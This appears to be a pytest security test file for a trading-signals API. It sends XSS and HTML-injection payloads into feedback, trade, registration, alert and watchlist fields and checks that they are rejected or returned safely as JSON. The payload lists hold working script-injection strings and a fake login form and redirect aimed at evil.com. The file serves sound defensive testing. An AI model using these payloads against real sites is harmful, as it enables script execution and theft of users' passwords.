"""v1.3.2 — XSS & HTML Injection Tests.

Verify that all user-controlled text fields are safe from XSS when rendered.
The API returns JSON (not HTML), but stored XSS could affect the frontend.
Tests ensure script tags are either rejected, escaped, or stored safely.
"""

import pytest
from uuid import uuid4


XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "<iframe src='javascript:alert(1)'>",
    "javascript:alert(1)",
    "<body onload=alert('xss')>",
    "<input onfocus=alert('xss') autofocus>",
    "'\"><script>alert(1)</script>",
    "<div style='background:url(javascript:alert(1))'>",
    "{{constructor.constructor('alert(1)')()}}",  # Template injection
    "${alert(1)}",  # Template literal
    "<a href='javascript:alert(1)'>click</a>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror=alert(1)&gt;\">",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
]

HTML_INJECTION_PAYLOADS = [
    "<h1>Injected</h1>",
    "<form action='https://evil.com'><input name='password'><button>Submit</button></form>",
    "<marquee>hacked</marquee>",
    "<blink>vulnerability</blink>",
    "<meta http-equiv='refresh' content='0;url=https://evil.com'>",
]


class TestXSSInSignalFeedback:
    """XSS tests in signal feedback notes field."""

    @pytest.mark.asyncio
    async def test_xss_in_feedback_notes(self, test_client):
        """XSS payloads in feedback notes — should not crash, stored safely."""
        signal_id = str(uuid4())
        for payload in XSS_PAYLOADS[:5]:
            resp = await test_client.post(
                f"/api/v1/signals/{signal_id}/feedback",
                json={"action": "took", "notes": payload},
            )
            # Should either succeed (notes stored as text, not rendered) or 404 (no signal)
            assert resp.status_code in (201, 404), f"Unexpected status for: {payload}"

    @pytest.mark.asyncio
    async def test_html_injection_in_feedback(self, test_client):
        """HTML injection in feedback notes."""
        signal_id = str(uuid4())
        for payload in HTML_INJECTION_PAYLOADS:
            resp = await test_client.post(
                f"/api/v1/signals/{signal_id}/feedback",
                json={"action": "watching", "notes": payload},
            )
            assert resp.status_code in (201, 404)


class TestXSSInPortfolio:
    """XSS tests for portfolio trade fields."""

    @pytest.mark.asyncio
    async def test_xss_in_trade_notes(self, test_client):
        """XSS in trade notes field."""
        for payload in XSS_PAYLOADS[:3]:
            resp = await test_client.post(
                "/api/v1/portfolio/trades",
                json={
                    "symbol": "HDFCBANK",
                    "market_type": "stock",
                    "side": "buy",
                    "quantity": "1",
                    "price": "100.00",
                    "notes": payload,
                },
            )
            # Notes are free text — should be stored safely, not rendered as HTML
            assert resp.status_code in (201, 400, 422)


class TestXSSInAlertConfig:
    """XSS tests for alert configuration."""

    @pytest.mark.asyncio
    async def test_xss_in_username(self, test_client):
        """XSS in alert config username — should be rejected by validation."""
        for payload in XSS_PAYLOADS[:3]:
            resp = await test_client.post(
                "/api/v1/alerts/config",
                json={
                    "telegram_chat_id": 99999,
                    "username": payload,
                },
            )
            # Username has regex validation — XSS payloads should be rejected
            assert resp.status_code in (400, 422), f"Expected rejection for: {payload}"


class TestXSSInAuth:
    """XSS tests for authentication endpoints."""

    @pytest.mark.asyncio
    async def test_xss_in_register_name(self, test_client):
        """XSS in registration name field."""
        for payload in XSS_PAYLOADS[:3]:
            resp = await test_client.post(
                "/api/v1/auth/register",
                json={
                    "email": f"xss_{uuid4().hex[:8]}@test.com",
                    "password": "StrongPa$$w0rd!123",
                    "name": payload,
                },
            )
            # Name could contain angle brackets — Pydantic stores as-is
            # The key is that the API returns JSON, not HTML
            assert resp.status_code in (201, 400, 422)
            if resp.status_code == 201:
                data = resp.json()
                # Verify the response is JSON, not rendered HTML
                assert "text/html" not in resp.headers.get("content-type", "")


class TestXSSInAiQa:
    """XSS tests for AI Q&A endpoint."""

    @pytest.mark.asyncio
    async def test_xss_in_question(self, test_client):
        """XSS payload in AI question — goes to Claude, not rendered."""
        resp = await test_client.post(
            "/api/v1/ai/ask",
            json={
                "symbol": "HDFCBANK",
                "question": "<script>alert('xss')</script> What is the outlook?",
            },
        )
        assert resp.status_code in (200, 400, 422, 429, 500)


class TestXSSInWatchlist:
    """XSS tests for watchlist symbol."""

    @pytest.mark.asyncio
    async def test_xss_in_watchlist_symbol(self, test_client):
        """XSS in watchlist symbol — rejected by symbol validation."""
        resp = await test_client.post(
            "/api/v1/alerts/watchlist",
            json={
                "symbol": "<script>alert(1)</script>",
                "action": "add",
            },
        )
        assert resp.status_code in (400, 422)


class TestContentTypeHeaders:
    """Verify all API responses use JSON content type, not HTML."""

    @pytest.mark.asyncio
    async def test_signals_returns_json(self, test_client):
        """GET /signals returns application/json."""
        resp = await test_client.get("/api/v1/signals")
        assert "application/json" in resp.headers.get("content-type", "")

    @pytest.mark.asyncio
    async def test_history_returns_json(self, test_client):
        """GET /signals/history returns application/json."""
        resp = await test_client.get("/api/v1/signals/history")
        assert "application/json" in resp.headers.get("content-type", "")

    @pytest.mark.asyncio
    async def test_markets_returns_json(self, test_client):
        """GET /markets/overview returns application/json."""
        resp = await test_client.get("/api/v1/markets/overview")
        assert "application/json" in resp.headers.get("content-type", "")

    @pytest.mark.asyncio
    async def test_error_responses_are_json(self, test_client):
        """Error responses should be JSON, not HTML."""
        resp = await test_client.get(f"/api/v1/signals/{uuid4()}")
        assert resp.status_code == 404
        assert "application/json" in resp.headers.get("content-type", "")

    @pytest.mark.asyncio
    async def test_validation_errors_are_json(self, test_client):
        """Validation (422) errors should be JSON."""
        resp = await test_client.get("/api/v1/signals?min_confidence=not_a_number")
        assert resp.status_code == 422
        assert "application/json" in resp.headers.get("content-type", "")


class TestCSPHeaderPreventsXSS:
    """Verify Content-Security-Policy header blocks inline scripts."""

    @pytest.mark.asyncio
    async def test_csp_header_present(self, test_client):
        """CSP header should be present on API responses."""
        resp = await test_client.get("/api/v1/signals")
        csp = resp.headers.get("content-security-policy", "")
        # CSP should restrict script sources
        if csp:
            assert "script-src" in csp or "default-src" in csp

    @pytest.mark.asyncio
    async def test_x_content_type_options(self, test_client):
        """X-Content-Type-Options: nosniff prevents MIME sniffing."""
        resp = await test_client.get("/api/v1/signals")
        assert resp.headers.get("x-content-type-options") == "nosniff"


class TestReflectedXSSPrevention:
    """Test that user input is not reflected back unsafely."""

    @pytest.mark.asyncio
    async def test_error_message_does_not_reflect_raw_input(self, test_client):
        """Error messages should not reflect raw user input verbatim."""
        xss = "<script>alert(1)</script>"
        resp = await test_client.get(f"/api/v1/signals?market={xss}")
        assert resp.status_code == 400
        body = resp.json()
        detail = body.get("detail", "")
        # The error message should not contain unescaped HTML
        assert "<script>" not in detail, "Error reflects raw HTML — XSS risk"

    @pytest.mark.asyncio
    async def test_404_does_not_reflect_path(self, test_client):
        """404 responses should not reflect the requested path unsafely."""
        resp = await test_client.get("/api/v1/nonexistent/<script>alert(1)</script>")
        assert resp.status_code in (404, 405)
        body_text = resp.text
        assert "<script>" not in body_text or "application/json" in resp.headers.get("content-type", "")


class TestStoredXSSMitigation:
    """Verify that stored text fields don't enable XSS on retrieval."""

    @pytest.mark.asyncio
    async def test_shared_signal_xss_safe(self, test_client):
        """Shared signal view should not render stored XSS."""
        fake_id = str(uuid4())
        resp = await test_client.get(f"/api/v1/signals/shared/{fake_id}")
        # Even if found, response is JSON not HTML
        assert resp.status_code in (404, 200)
        if resp.status_code == 200:
            assert "application/json" in resp.headers.get("content-type", "")
